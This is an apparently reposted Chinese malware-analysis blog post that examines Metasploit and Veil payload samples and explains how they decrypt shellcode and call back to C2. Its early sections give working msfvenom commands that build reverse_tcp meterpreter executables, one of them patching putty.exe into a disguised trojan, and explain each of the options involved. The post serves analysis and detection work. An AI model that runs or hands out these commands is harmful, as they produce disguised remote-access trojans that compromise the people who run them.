> 原文链接: https://www.anquanke.com//post/id/231447 


# 恶意框架样本分析-从Veil到Msf


                                阅读量   
                                **205453**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t019759e4c5eef7a269.png)](https://p3.ssl.qhimg.com/t019759e4c5eef7a269.png)



## MSF概述

接上文，笔者通过上一篇文章逐渐完成了从CobaltStrike到Veil框架的过渡，在文章后半部分着重介绍了Veil框架的基本使用，也对Veil框架生成的一些恶意样本进行了一个简单的分析。

所以本文志在完成从Veil到msf的过渡，看看这些工具框架，为什么深得红队和攻击者的喜爱。

在上篇文章的最后，笔者通过Veil框架生成了c/meterpreter类型的payload并通过阅读生成的c语言代码梳理了c/meterpreter的整个流程。那么meterpreter到底是什么呢，所以在继续深入分析Veil框架所生成的木马之前，我们先来看看meterpreter相关的一些信息。

通常我们说的msf指的是MetaSploit Framework。msf是一款强大的渗透测试工具，它主要是包含了msfvenom和meterpreter。其中msfvenom是msfpayload,msfencode的结合体,它的优点是单一命令行和效率.利用msfvenom生成各种版本木马程序,并在目标机上执行,在本地监听上线，执行攻击。Meterpreter是msf强大的后渗透模块。



## MSF所有类型

在kali中启动msf，然后在控制台输入msfvenom -h 查看帮助选项：

[![](https://p3.ssl.qhimg.com/t0120eb65010d7d0614.png)](https://p3.ssl.qhimg.com/t0120eb65010d7d0614.png)

-l 参数指定了msfvenom可生成那些类型的payload以供攻击者使用，包括payload的类型、payload编码方式、加密方式、填充方式、操作系统平台、处理器架构等等。

msfvenom -l type 可查看msf所有可生成的样本类型，一共562种。具体可生成的类型可在在msf控制台中输入指令查看或在[这里](https://www.yuque.com/p1ut0/qtmgyx/ik3omh)查看.

msfvenom -l archs 可查看msf可生成的所有平台的样本：

```
aarch64
    armbe
    armle
    cbea
    cbea64
    cmd
    dalvik
    firefox
    java
    mips
    mips64
    mips64le
    mipsbe
    mipsle
    nodejs
    php
    ppc
    ppc64
    ppc64le
    ppce500v2
    python
    r
    ruby
    sparc
    sparc64
    tty
    x64
    x86
    x86_64
    zarch
```

msfvenom -l encoders 会列出msf payload所有的编码方式

```
cmd/brace                     low        Bash Brace Expansion Command Encoder
    cmd/echo                      good       Echo Command Encoder
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Bourne $`{`IFS`}` Substitution Command Encoder
    cmd/perl                      normal     Perl Command Encoder
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
    generic/eicar                 manual     The EICAR Encoder
    generic/none                  normal     The "none" Encoder
    mipsbe/byte_xori              normal     Byte XORi Encoder
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder
    ppc/longxor                   normal     PPC LongXOR Encoder
    ppc/longxor_tag               normal     PPC LongXOR Encoder
    ruby/base64                   great      Ruby Base64 Encoder
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
    x64/xor                       normal     XOR Encoder
    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder
    x64/xor_dynamic               normal     Dynamic key XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/bmp_polyglot              manual     BMP Polyglot
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder (optimised)
    x86/service                   manual     Register Service
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
    x86/xor_dynamic               normal     Dynamic key XOR Encoder
```

msfvenom -l encrypt可列出msf样本中所有的代码加密方法

```
aes256
    base64
    rc4
    xor
```

msfvenom -l formats可列出msf所有可生成的格式类型

```
asp
    aspx
    aspx-exe
    axis2
    dll
    elf
    elf-so
    exe
    exe-only
    exe-service
    exe-small
    hta-psh
    jar
    jsp
    loop-vbs
    macho
    msi
    msi-nouac
    osx-app
    psh
    psh-cmd
    psh-net
    psh-reflection
    vba
    vba-exe
    vba-psh
    vbs
    war
    bash
    c
    csharp
    dw
    dword
    hex
    java
    js_be
    js_le
    num
    perl
    pl
    powershell
    ps1
    py
    python
    raw
    rb
    ruby
    sh
    vbapplication
    vbscript
```



## 生成MSF基本木马

所以可以通过msfvenom 加一些组合指令，进行msf payload的生成。最基本的生成指令为：

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.230.129 LPORT=80 —platform win -f exe -o meterpreter_x86_tcp.exe
```

拆解一下可以得知

-p是刚才我们看到的payload类型，一共有五百多中

lhost 是需要指定的c2地址

lport 是需要制定的c2端口

—platform 是指定平台

-f 是指定format格式

-o是out表明输出路径

除此之外，还可以通过

-e 指定编码<br>
-b 指定过滤的坏字符<br>
-i 指定shellcode混淆的次数<br>
-c 指定要包含的额外的shellcode文件<br>
-x 指定一个自定义的可执行文件作为模板进行捆绑<br>
-k 保留原本的模板文件功能，创建新线程注入payload<br>
-t 指定payload等待时间等等

[![](https://p0.ssl.qhimg.com/t01e56fc93975ef0a99.png)](https://p0.ssl.qhimg.com/t01e56fc93975ef0a99.png)

这样一来，玩法就很多了，就光是平台、payload类型、format、encoder等参数组合生成，可生成的样本就已经是指数级上升了。



## MSF样本分析

### <a class="reference-link" name="%E5%88%9B%E7%BA%BF%E7%A8%8B%E7%B1%BB%E6%A0%B7%E6%9C%AC"></a>创线程类样本

生成常见patch putty类的样本，就是入口点创建线程，然后解密后续payload的类型，主要就是-k参数

```
msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.1 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe
```

入口点代码如下：

[![](https://p3.ssl.qhimg.com/t0103e6c42dbbd14522.png)](https://p3.ssl.qhimg.com/t0103e6c42dbbd14522.png)

程序运行之后，首先会通过lea edx,byte_xxxx的方式将编码后的shellcode地址赋值给edx，然后创建线程执行edx处的函数。edx函数过来，前面一段解密代码，由于在生成样本的时候指定了i=3，所以这里会通过3个loop，边执行边解密后面的代码。

[![](https://p5.ssl.qhimg.com/t0143a8a0d7c72076bb.png)](https://p5.ssl.qhimg.com/t0143a8a0d7c72076bb.png)

实际上，-x 的patch操作不仅是针对putty的，msfvenom可通过-x参数patch任意文件，并且根据官方的描述，-k参数可以使得被patch的程序keep原始的功能，只是将shellcode作为一个新线程注入执行。

```
-k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
```

所以理论上来讲，-x -k 方式patch的程序，是会保持原有功能的。

这里这里以CFF Explorer为例，看看程序被patch之后，是否还保存着原有的功能。

原始程序不依赖任何环境可正常运行

[![](https://p3.ssl.qhimg.com/t011f0375f1d2bb04f1.png)](https://p3.ssl.qhimg.com/t011f0375f1d2bb04f1.png)

为了看起来方便，这里就不对payload进行编码了，直接生成：

[![](https://p4.ssl.qhimg.com/t011adf15afd6617ee5.png)](https://p4.ssl.qhimg.com/t011adf15afd6617ee5.png)

由于-k 参数保存了程序的原代码，所以patch的时候会将shellcode插入到程序中，patch后的程序就会比原程序大很多：

[![](https://p3.ssl.qhimg.com/t012a9af2e4003d2720.png)](https://p3.ssl.qhimg.com/t012a9af2e4003d2720.png)

将两个程序载入IDA可知，被patch的程序并没有新增节，而是就将线程注入的代码插入在了text节中，当线程创建之后，程序会jmp跳转到程序原始的入口点去。

[![](https://p3.ssl.qhimg.com/t018a1f3b7ca782d2ff.png)](https://p3.ssl.qhimg.com/t018a1f3b7ca782d2ff.png)

但是在实际调试的时候发现，jmp过去之后并不能正常的将原来的代码启动起来。为了确定不是CFF Explorer的问题，笔者自己编译了一个C语言编写的helloworld程序。

[![](https://p3.ssl.qhimg.com/t01e36d0c9ef15fc282.png)](https://p3.ssl.qhimg.com/t01e36d0c9ef15fc282.png)

patch之后的程序可以正常启用原代码，所以可以推测是CFF本身的问题导致patchCFF 之后不能启动，或者是msfvenom patch过大的程序就有可能出现这样的bug。

而执行的线程代码也比较简单，首先是通过一个loop动态解密后面的代码，这里要执行多少个循环跟生成木马时指定的i相关，不再赘述

[![](https://p1.ssl.qhimg.com/t01c243e01651e5e25b.png)](https://p1.ssl.qhimg.com/t01c243e01651e5e25b.png)

代码解密之后，动态解密api地址，然后通过jmp eax的方式加载执行

[![](https://p2.ssl.qhimg.com/t014a5fc661149ba478.png)](https://p2.ssl.qhimg.com/t014a5fc661149ba478.png)

以Http协议为例，在InternetConnect函数的时候跟进去，然后根据参数很明显的就可以看到回连的C2地址：

[![](https://p3.ssl.qhimg.com/t01c62b90a6b5ebc429.png)](https://p3.ssl.qhimg.com/t01c62b90a6b5ebc429.png)

刚看完CobaltStrike分段Beacon样本的读者应该还记得，CobaltStrike样本中的shellcode也是通过这样的方式解密执行的。对比分析的话可以发现这里的代码基本一样，这是因为早期的CobaltStrike是内嵌在msf框架内部的，最开始cs是作为msf的一个工具，后来才慢慢独立出来打包成了一个新的产品。所以这段加载的shellcode，应该是从msf”继承”过来的。

### <a class="reference-link" name="%E5%AE%8C%E5%85%A8patch%E7%9A%84%E6%A0%B7%E6%9C%AC"></a>完全patch的样本

上面的参数如果去掉-k ，那么程序入口点则会是一段不定长度的混淆代码（每次生成的长度不一样）

[![](https://p2.ssl.qhimg.com/t017851a9f4659383ed.png)](https://p2.ssl.qhimg.com/t017851a9f4659383ed.png)

前面的无用代码跑完之后，程序会通过多个jmp解密代码，同时干扰用户分析。

[![](https://p3.ssl.qhimg.com/t0149f74b71616c84fa.png)](https://p3.ssl.qhimg.com/t0149f74b71616c84fa.png)

F8步过jmp ，找到jl或者jne这种可跳转出去的地方

[![](https://p5.ssl.qhimg.com/t0167eb9e61becfbde6.png)](https://p5.ssl.qhimg.com/t0167eb9e61becfbde6.png)

这里看样子应该是jne跳走的，所以直接在jne下面设置断点跑过去即可过掉第一部分的jmp

[![](https://p5.ssl.qhimg.com/t010bc706853393c4fb.png)](https://p5.ssl.qhimg.com/t010bc706853393c4fb.png)

跳过多次之后，程序会解密出VirtualAlloc的API

[![](https://p5.ssl.qhimg.com/t01cfc275f546a1aa12.png)](https://p5.ssl.qhimg.com/t01cfc275f546a1aa12.png)

拷贝shellcode到分配出来的内存空间：

[![](https://p3.ssl.qhimg.com/t01863193d89255b837.png)](https://p3.ssl.qhimg.com/t01863193d89255b837.png)

然后call 到该内存中继续执行：

[![](https://p0.ssl.qhimg.com/t01aa1f5907047d7ef6.png)](https://p0.ssl.qhimg.com/t01aa1f5907047d7ef6.png)

过来的代码就很熟悉了，其实就是创建线程类样本所创建的线程函数：

[![](https://p1.ssl.qhimg.com/t01d98320c77dfd3c94.png)](https://p1.ssl.qhimg.com/t01d98320c77dfd3c94.png)

该段shellcode也硬编码在text节中

[![](https://p5.ssl.qhimg.com/t01681652d8df56560b.png)](https://p5.ssl.qhimg.com/t01681652d8df56560b.png)

关于MSF框架的基本信息和通过默认配置生成的木马差不多就是这样了，这里只是先对其进行一个大概的介绍，方便下文接着分析Veil。



## Veil(下)

### <a class="reference-link" name="%E6%A6%82%E8%BF%B0"></a>概述

书接上文，学习了msf的meterpreter，现在接着看看Veil生成的meterpreter相关样本。

### <a class="reference-link" name="cs/meterpreter"></a>cs/meterpreter

这里的cs并不是CobaltStrike，而是CSharp。

Veil的9到13选项是cs/meterpreter形式的payload，其中前面三类是通过解密硬编码在样本中的数据得到下载地址，下载后续payload到内存之后创建线程加载执行。后面两类是直接将一段shellcode通过一定的编码方式存放在样本中，创建线程执行。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t010fc1521a17a3f217.png)

键入use 9 的命令尝试创建一个cs/meterpreter/rev_http类型的样本，相比c语言类型的样本，此类配置就稍显浮渣一些，包括设置检测调试器、限制domain、payload到期时间、心跳时间等等。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01d1d115262a6f81f6.png)

这里仅开启反调试并生成对应的payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019f1265a3d1b93922.png)

生成出来的C#样本是一个下载器，体积非常小，只有6144字节：

[![](https://p3.ssl.qhimg.com/t0125309c9a207ee8ca.png)](https://p3.ssl.qhimg.com/t0125309c9a207ee8ca.png)

程序的没有多余的代码，就是解密拼接下载路径然后进行网络请求下载后续payload创建线程执行：

[![](https://p1.ssl.qhimg.com/t01fe43005b61379ae0.png)](https://p1.ssl.qhimg.com/t01fe43005b61379ae0.png)

由于在生成样本的时候启用了反调试选项，这里在Main可以看到程序用了一个非常简单的检测反调试代码

```
if(!Debugger.IsAttached)
```

程序启动后，根据生成的随机数r和预定义的数组计算出一个长度为4的请求路径然后与main函数中预定义的ip地址进行拼接，由于请求路径的生成算法中有个随机数r，所以每次启动的请求路径是不同的：

[![](https://p3.ssl.qhimg.com/t01edbb7cd27e5a7ac2.png)](https://p3.ssl.qhimg.com/t01edbb7cd27e5a7ac2.png)

拼接出请求路径之后，程序将会构建请求头然后尝试访问该地址并下载后续的payload，并且根据代码可知，下载回来的数据长度不小于100000

[![](https://p3.ssl.qhimg.com/t0175a556df536b3742.png)](https://p3.ssl.qhimg.com/t0175a556df536b3742.png)

最后就是创建线程以执行这段byte

[![](https://p2.ssl.qhimg.com/t015e8baa28f8fb0b7a.png)](https://p2.ssl.qhimg.com/t015e8baa28f8fb0b7a.png)

下载回来的payload又是老相识：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a9b8fdc514c156da.png)

通过火绒剑的内存查看工具，可以看到这段shellcode的头部代码，头部基本可以看出属于msf的shellcode:

[![](https://p1.ssl.qhimg.com/t015dbd3d6c2d20d0cd.png)](https://p1.ssl.qhimg.com/t015dbd3d6c2d20d0cd.png)

关于这段shellcode的调试方法比较多，可以将其dump出来调试，也可以直接通过x64dbg这类工具进行调试。

由于dnspy不支持调试指定的内存，这个时候就需要借助od或x64dbg这类调试工具，但od这类的工具调试.NET样本的话，外层是.NET虚拟机，这里就需要想办法绕过外层的.NET虚拟机进入到内层的代码。

通过C#代码已经得知程序最后是调用CreateThread将shellcode加载起来的，所以这里就对CreateThread的下层API设置断点，比如ZwCreateThreadEx

设置好断点之后，转到线程窗口，当看到可疑的线程出来之后即可右键转到线程入口查看：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t011442a5a7d415c7a7.png)

这里很快就定位到00C10000这个线程就是我们在找的线程，此时重新加载样本，在序号为12的线程启动起来之前，回到代码的用户空间，然后对VirtualAlloc设置断点即可定位到分配空间并将下载回来的shellcode赋值的部分：

[![](https://p2.ssl.qhimg.com/t0135294d40abe422c5.png)](https://p2.ssl.qhimg.com/t0135294d40abe422c5.png)

直接对这个00B60000设置断点即可过来：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0142d78c7300f7b0ee.png)

这里的shellcode首先会通过一个循环解密后面的数据：

[![](https://p5.ssl.qhimg.com/t01022d0b10dcb28d82.png)](https://p5.ssl.qhimg.com/t01022d0b10dcb28d82.png)

解密之后如下：

[![](https://p4.ssl.qhimg.com/t01368394dcbad6d468.png)](https://p4.ssl.qhimg.com/t01368394dcbad6d468.png)

代码解密完成之后，程序会通过LoadLibrary和GetProcAddress获取所需API的地址

[![](https://p4.ssl.qhimg.com/t018d30569f0b882d8d.png)](https://p4.ssl.qhimg.com/t018d30569f0b882d8d.png)

由于篇幅原因，这里不再对后面的代码进行详细分析，感兴趣的朋友可以可以跟着调一下后面这部分后门代码。

### <a class="reference-link" name="cs/shellcode_Inject"></a>cs/shellcode_Inject

在Veil框架中生成C#的注入代码，分别由base64.py和virtual.py实现。

base64.py可生成默认样本、msfvenom类型样本、以string形式存在的shellcode和以hex存在的shellcode

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01723a5525e0f8fcb8.png)

通过此类方法会和之前一样，生成一段shellcode然后通过该段shellcode生成一个文件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t014e3f38212969fd65.png)

此次生成的样本依旧很小，但是和上一类样本的加载方式就截然不同

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d08435507432aff8.png)

这里程序将上面看到的shellcode编码成了base64的字符串，直接将这段shellcodedump出来调试，就是一段下载后续payload的shellcode

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01352c64ed46d81970.png)

其他编码的样本大同小异，这里就不重复分析了。

### <a class="reference-link" name="lua/perl%20Shellcode"></a>lua/perl Shellcode

Veil框架中18 和19 选项分别用于生成lua脚本和perl脚本，两类脚本均为加载硬编码在代码中的shellcode：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e7283e3ea2f35b60.png)

加载代码如下：

[![](https://p0.ssl.qhimg.com/t01ecba28a66c4af80f.png)](https://p0.ssl.qhimg.com/t01ecba28a66c4af80f.png)

### <a class="reference-link" name="Powershell/meterpreter"></a>Powershell/meterpreter

Veil中20到24选项可以生成Powershell类型的meterpreter

[![](https://p0.ssl.qhimg.com/t0157578086ce34c4ad.png)](https://p0.ssl.qhimg.com/t0157578086ce34c4ad.png)

但这里并不是直接生成Powershell类型的ps1文件，而是生成一个bat文件，在bat中调用Powershell.exe以执行Powershell代码，bat文件文件对操作系统进行了判断，保证系统会在32位的模式下启动这段shellcode。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e317e8b673a30d76.png)

这里执行的Powershell代码是一段压缩后的二进制流，将其解压缩之后如下，同样的是创建线程以从C2下载后续。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d12879e589fdaef4.png)

经过分析，python、Ruby、Powershell多种类型的shellcode加载方式一致，主要是代码语法不同，这里就不一一展开了。目前已经基本完成CobaltStrike、Veil所生成的一些木马的完整分析。msf由于框架过于庞大，无法对其所有的样本进行详细分析。但是相信大家以后在分析过程中遇到这三类的样本时候，可以很快的看出来。
